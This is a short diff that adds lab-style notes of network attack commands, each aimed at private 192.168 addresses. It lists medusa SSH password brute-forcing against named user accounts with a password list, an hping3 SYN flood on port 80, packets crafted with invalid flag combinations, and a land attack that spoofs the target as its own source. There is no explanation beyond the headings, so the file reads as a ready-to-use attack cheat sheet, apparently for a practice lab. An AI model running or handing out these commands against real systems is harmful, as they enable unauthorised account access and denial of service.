@@ -1,1 +1,14 @@
+SSH brute-forcing
 medusa -u grigorz -P pswlist.txt -M ssh -t 5 -h 192.168.182.130
+medusa -u grigor -P pswlist.txt -M ssh -t 5 -h 192.168.176.135
+
+SYN Attack
+hping3 -i u1 -S -p 80 192.168.176.135
+
+Invalid Packets
+hping3 -c 1 -V -p 80 -s 5050 -M 0 -UPF 192.168.176.135
+
+Land Attack
+hping3 -a 192.168.176.135 192.168.176.135 --icmp
+
+
